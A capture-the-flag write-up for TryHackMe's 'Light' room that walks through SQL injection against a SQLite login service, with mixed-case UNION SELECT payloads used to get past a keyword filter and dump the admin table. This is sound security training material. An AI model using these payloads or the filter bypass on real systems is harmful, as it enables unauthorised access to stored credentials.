## Description

> I am working on a database application called Light! Would you like to try it out?  
> If so, the application is running on **port 1337**. You can connect to it using `nc 10.10.16.96 1337`  
> You can use the username `smokey` in order to get started.
> 
> **Note:** Please allow the service 2 - 3 minutes to fully start before connecting to it.

The challenge is rated as *easy* and can be found there -> <https://tryhackme.com/r/room/lightroom>.

## Exploitation

As the description said, we first need to connect to the light database service. Then I inputted the username, which was given in the description, we got a password, interesting.

The next thing I did is testing for SQL injection because this is a database application. I tried double and single quotes.

```terminal
Please enter your username: "
Username not found.
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```



The single quote looks promising. So I next tired to get the first entry of the table.
```terminal
Please enter your username: admin' OR 1=1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

We are restricted to don't use `--`, this shouldn't be a problem. I next tried to get the number of columns.

```terminal
Please enter your username: ' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
```

Looks like our `SELECT` or `UNION` isn't accepted, that is why I next tried something like `sElEcT` and `SELEct` instead of `SELECT` and `UNION`. With that we finally get our desired output.

```terminal
Please enter your username: ' UNIon SELEct 1 '
Password: 1
```

Next we can check if we can retrieve a database version. I used this payload.

```terminal
Please enter your username: ' UNIon SELEct database() '
Error: no such function: database
```

Apparently this is not a MySQL/MariaDB database, this is why I next used the following query which is made for SQLite, as the challenge name already hints, this could be a 'Light' database.

```terminal
Please enter your username: ' UniON selEct sql FROm sqlite_master '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

> **Why this query works**
>
> The query which retrieves the password from the table looks something like this:
> ```sql
> select password from admintable where username = '' LIMIT 30
> ```
> We input the SQL injection payload into the username where field. If we terminate the field with a single quote (`'`) and add a `UNION` and a `SELECT` statement, we can select data, after that we need to close the query that it won't error with a single quote. We can simply close the single quote and get the data of the `SELECT`, that way we don't need a termination string, this is just how `SQLite` handles the query. The empty string is interpreted as an [alias](https://www.w3schools.com/sql/sql_alias.asp).
> ```sql
> select password from admintable where username = '' union select <Anything> '' LIMIT 30
> ```
> Only if we add a comma between `<Anything>` and the string (`''`), we get the column error: `left and right of UNION do not have the same number of result columns`. This is because now we have two columns in this query.
> 
> **Note**: I tested these queries on my local machine for understanding the way these queries are processed.
{: .prompt-tip }

This gave me the whole table information, with that I next tried to extract the first entry of the table:

```terminal
Please enter your username: ' UniON selEct username FROm admintable '
Password: [REDACTEDAdminUserREDACTED]
```

This gave use the asked username, and we can also try to extract the first password. 

```terminal
Please enter your username: ' UniON selEct password FROm admintable '
Password: THM{THIS_IS_NOT_VALID_FLAG}
```

Lastly the question is to get the admin password. For that I simply appended a `where` statement to select the admin user.

```terminal
Please enter your username: ' UniON selEct password FROm admintable where username='TryHackMeAdmin' OR '
Password: DEMOPASSWORDREDACTED
```

With some tricks and some obfuscation of your payload you can easily solve this challenge.

I really enjoyed this challenge.
